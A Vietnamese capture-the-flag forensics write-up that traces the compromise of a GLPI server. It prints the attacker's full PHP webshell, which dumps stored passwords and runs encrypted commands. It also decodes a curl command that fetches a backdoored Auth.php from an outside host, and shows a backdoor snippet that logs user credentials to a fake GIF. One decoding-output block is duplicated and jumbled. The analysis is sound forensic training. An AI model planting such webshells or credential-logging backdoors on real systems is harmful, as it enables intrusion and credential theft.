---
title: "HeroCTF_For2"
excerpt_separator: "<!--more-->"
categories:
  - HeroCTF 2025, Forensics
tags:
  - Writeup
  - Forensics
---
> **Chủ đề:** Điều tra server pensive.hogwarts.local để tìm cách attacker chiếm tài khoản của Albus Dumbledore  
> **Mục tiêu:** Trả flag theo format:  
> `Hero{/var/idk/file.ext;/var/idk/file.ext;AnExample?}

---
#  Mô tả thử thách
 > "The director of Hogwarts got his account compromised. The last time he logged on legitimately was from 192.168.56.230 (pensive.hogwarts.local). Investigate to identify how his account got compromised from this server. Please find the following information to go forward in this case:
> - Absolute path of the file which led to the compromise.
> - Absolute path of the file used by the attacker to retrieve Albus' account.
> - The second file stores two pieces of information. The 3rd flag part is the value of the second field of the second piece of information.
> The findings have to be separated by a `;`."

**Tóm tắt yêu cầu:** Chúng ta cần tìm 3 mảnh thông tin:
1.  Đường dẫn tuyệt đối của file gây ra sự cố (bị ghi đè/lợi dụng).
2.  Đường dẫn tuyệt đối của file mà attacker dùng để lưu/lấy tài khoản.
3.  Giá trị trường thứ 2 trong bộ dữ liệu thứ 2 tìm được.
# Phân tích tổng quan
  Sau khi extract ta được 2 thư mục chính là:
  * `/var/log`
  * `/var/www/glpi`
 
  Từ thử thách trước là bài ***Forensics 01***  có được thông tin IP Address của attacker là 192.168.56.200 nên tôi đã bắt đầu với việc tìm kiếm chuỗi IP này trong các log và đã  tìm thấy dấu hiệu đáng ngờ đầu tiên trong file `var/www/glpi/ajax/fileupload.php` thông qua dòng log dưới đây:
  ```
 192.168.56.200 - - [22/Nov/2025:23:03:49 +0000] "POST /ajax/fileupload.php?_method=DELETE&_uploader_picture%5B%5D=setup.php HTTP/1.1" 200 742 "-" "python-requests/2.32.5"
  ```
  Có thể thấy attacker đã upload file `setup.php` lên server thông qua file `fileupload.php`. Tiếp tục phân tích file `setup.php` để tìm hiểu chức năng của nó.
# Phân tích file setup.php  
Sau khi tìm kiếm tôi đã tìm thấy file `setup.php` trong thư mục `var/www/glpi/files/_tmp/` với nội dung như sau:
```php
<?php

/****************************************************************
 * Webshell Usage:
 *   ?passwd=P@ssw0rd123 --> Print glpi passwords in use
 *   ?passwd=P@ssw0rd123&_hidden_cmd=whoami --> Execute whoami
 *
 * Used here exploits/utils/glpi_utils.py:method:get_glpi_shell
 *
 * ```bash
 * python3 -c 'import zlib;import base64; shell = open("shell.php", "rb");print(base64.b64encode(zlib.compress(shell.read())));shell.close()'
 * ```
 ****************************************************************/

error_reporting(E_ERROR | E_PARSE);

$SECURITY_STRATEGY = "no_check";

function title($m){
  echo "<b><u>" . htmlentities(ucfirst($m)) . "</b></u></br>\n";
}

function decrypt_pass($pass){
  if(method_exists("GLPIKey", "decrypt")){
    return (new GLPIKey())->decrypt($pass);
  } elseif(method_exists("Toolbox", "decrypt")){
    if(method_exists("Toolbox", "sodiumDecrypt")){
      return Toolbox::sodiumDecrypt($pass);
    }
    ### Really old glpi decrypted with a key in the config
    return Toolbox::decrypt($pass, GLPIKEY);
  } else {
    return "<ENCRYPTED>[{$pass}]";
  }
}

function dump_password(){
  global $CFG_GLPI, $DB;

  ### Show password informations
  # Dump Proxy scheme
  # Dump LDAP Password
  if(!empty($CFG_GLPI["proxy_name"]))
  {
    $proxy_credz = !empty($CFG_GLPI["proxy_user"])?$CFG_GLPI["proxy_user"] . ":" . decrypt_pass($CFG_GLPI["proxy_passwd"]) . "@":"";
    $proxy_url = "http://{$proxy_credz}" . $CFG_GLPI['proxy_name'] . ":" . $CFG_GLPI['proxy_port'];
    title("proxy:");
    Html::printCleanArray(array("Proxy In Use" => $proxy_url));
  }
  $auth_methods = Auth::getLoginAuthMethods();

  $config_ldap = new AuthLDAP();
  $all_connections = $config_ldap->find();

  foreach($all_connections as $connection){
    if(isset($connection['rootdn_passwd']) && isset($connection['rootdn'])){
      $ldap_pass = decrypt_pass($connection['rootdn_passwd']);
      title("Ldap Connexion:");
      Html::printCleanArray(array("LDAP Base" => $connection['rootdn'], "LDAP DN" => $connection["basedn"], "LDAP Password" => $ldap_pass, "Connection is active" => $connection['is_active']));
      }
    }

  # Dump DB password
  if(!is_null($DB)){
    title("Database informations:");
    Html::printCleanArray(array("DB Host" => $DB->dbhost,
                                "DB Database" => $DB->dbdefault,
                                "DB User" => $DB->dbuser,
                                "DB Password" => urldecode($DB->dbpassword)));
  }
}

if(isset($_GET["submit_form"]) && $_GET["submit_form"] === "2b01d9d592da55cca64dd7804bc295e6e03b5df4")
{
  for ($i=0; $i < 4; $i++) {
    $relative = str_repeat("../", $i);

    $to_include = "{$relative}inc/includes.php";


    if(file_exists($to_include)){
      include_once($to_include);
      try{
        Html::header("GLPI Password");

        $key = "14ac4b90bd3f880e741a85b0c6254d1f";
        $iv  = "5cf025270d8f74c9";

        if(isset($_GET["save_result"]) && !empty($_GET["save_result"]))
        {
          $output=null;
          $retval=null;

          $encrypted = base64_decode($_GET['save_result']);
          $decrypted = openssl_decrypt($encrypted, "AES-256-CBC", $key, OPENSSL_RAW_DATA, $iv);

          exec($decrypted, $output, $retval);

          echo "<code>";
          foreach ($output as $line) {
            echo htmlentities($line) . "</br>";
          }
          echo "</code></br>";
        } else {
          dump_password();
        }
      } catch(Exception $e) {
        echo $e->getMessage();
      }
      break;
    }
  }
}
?>
```
  File `setup.php` là một webshell cho phép attacker thực thi lệnh trên server thông qua tham số `save_result` sau khi đã mã hóa AES-256-CBC với key và IV được hardcode trong file.
# Tìm kiếm dấu vết attacker trong log
  Quay trở lại với log, ta tiếp tục lọc các log có chứa chuỗi `save_result` để tìm các request liên quan đến việc thực thi lệnh thông qua webshell `setup.php`. Sử dụng lệnh strings | grep:
  ```bash
  strings glpi_ssl_access.log | grep 'save_result'
  ```
  Ta thu được các dòng log như sau (tôi đã lọc các log có chứa giá trị sau tham số `save_result`):
  ```
192.168.56.1 - - [22/Nov/2025:23:09:36 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=oGAHt/Kk1OKeXWxy7iXUfw== HTTP/1.1" 200 12649 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
192.168.56.1 - - [22/Nov/2025:23:09:55 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=oGAHt/Kk1OKeXWxy7iXUfw== HTTP/1.1" 200 12645 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
192.168.56.1 - - [22/Nov/2025:23:10:02 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE= HTTP/1.1" 200 28264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
192.168.56.1 - - [22/Nov/2025:23:10:51 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=86AyGErKuj5UoZE9eHtlIg== HTTP/1.1" 200 28168 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"                                   
  ```
Từ các tham số save_result ta có thể giải mã được các lệnh attacker đã thực thi trên server. Sử dụng đoạn script Python sau để giải mã:
```python
import base64
from Crypto.Cipher import AES

# Key và IV lấy trực tiếp từ webshell PHP
key = b"14ac4b90bd3f880e741a85b0c6254d1f"   # 32 bytes
iv  = b"5cf025270d8f74c9"                  # 16 bytes

samples = [
    "oGAHt/Kk1OKeXWxy7iXUfw==",
    "4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=",
    "86AyGErKuj5UoZE9eHtlIg=="
]

for s in samples:
    encrypted = base64.b64decode(s)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)

    # Strip padding + null bytes giống exec() PHP
    decrypted = decrypted.rstrip(b"\x00").rstrip()

    print("Encoded :", s)
    print("Decoded :", decrypted.decode(errors="ignore"))
    print("-" * 40)
```
Kết quả giải mã các lệnh thực thi:
```
Encoded : oGAHt/Kk1OKeXWxy7iXUfw==
Decoded :
#UXP)fq
----------------------------------------
Encoded : 4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=
Decoded : curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
----------------------------------------
Encoded : 86AyGErKuj5UoZE9eHtlIg==
4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=
Decoded : curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
----------------------------------------
Encoded : 86AyGErKuj5UoZE9eHtlIg==
Decoded : whoami
```
  Từ kết quả trên ta thấy attacker đã sử dụng lệnh `curl` để tải một backdoor từ `https://xthaz.fr/glpi_auth_backdoored.php` và ghi đè vào file `Auth.php` trong thư mục `var/www/glpi/src/`. 
# Phân tích file Auth.php
 Vì file `Auth.php` khá dài nên tôi sẽ để link để các bạn có thể tải và nghiên cứu thêm:
  [glpi_auth_backdoored.php](https://raw.githubusercontent.com/xthaz/HeroCTF-2025/main/Forensics/For2HeroCTF/glpi_auth_backdoored.php)
  Qua phân tích file `Auth.php` ta thấy đây là một backdoor nằm trong luồng đăng nhập hợp pháp, cụ thể ngay trước khi gọi LDAP authentication:
```php
$data = json_encode([
   'login' => $login_name,
   'password' => $login_password,
]);

$encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
$encoded = base64_encode($encrypted) . ";";

$file = "/var/www/glpi/pics/screenshots/example.gif";
file_put_contents($file, $encoded, FILE_APPEND);
```
  Backdoor này sẽ lấy thông tin đăng nhập (username và password) của người dùng và mã hóa bằng AES-256-CBC với key và IV được hardcode trong file, sau đó lưu trữ chuỗi đã mã hóa vào file `/var/www/glpi/pics/screenshots/example.gif`.
Tiếp tục phân tích file `example.gif` để lấy thông tin đăng nhập của Albus Dumbledore.
Sau khi sử dụng lệnh file ta thấy file `example.gif` không phải là file ảnh thực sự mà chỉ là một file text chứa chuỗi đã mã hóa:
```
example.gif:                 ASCII text, with no line terminators
cat example.gif 
mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;
```
Dựa vào file `Auth.php` tôi đã trích xuất key và sử dụng đoạn mã python sau để decode ra kết quả:
```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b"ec6c34408ae2523fe664bd1ccedc9c28"
iv  = b"ecb2b0364290d1df"

data = (
    "mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;"
    "U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;"
)

payloads = [p for p in data.split(";") if p]

for i, p in enumerate(payloads, 1):
    encrypted = base64.b64decode(p)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)

    try:
        decrypted = unpad(decrypted, 16)
    except ValueError:
        pass

    print(f"[Record {i}]")
    print(decrypted.decode("utf-8"))
    print("-" * 40)
```
Kết quả decode: 
```
[Record 1]
{"login":"Flag","password":"Hero{FakeFlag:(}"}
----------------------------------------
[Record 2]
{"login":"albus.dumbledore","password":"FawkesPhoenix#9!"}
----------------------------------------
```
# Kết luận
 FLAG: 
 ```
 Hero{/var/www/glpi/src/Auth.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}
```
